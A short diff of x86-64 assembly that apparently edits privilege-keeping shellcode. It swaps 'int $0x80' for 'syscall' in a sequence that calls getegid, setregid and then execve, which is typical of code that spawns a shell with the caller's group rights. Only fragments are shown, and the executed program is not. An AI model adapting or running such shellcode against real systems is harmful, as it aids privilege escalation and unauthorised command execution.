@@ -4,15 +4,17 @@
 main:
     push $0x6c
     pop  %rax
-    int  $0x80
+    syscall
+
     push %rax
     push %rax
     pop  %rdi
     pop  %rsi
+
     push $0x72
     pop  %rax
-    push 0x673a
-    int  $0x80
+    syscall
+
 
     push $0x31
     pop  %rax
@@ -30,5 +32,5 @@ main:
     pop  %rdi
     push $0x3b
     pop  %rax
-    int  $0x80
+    syscall
 
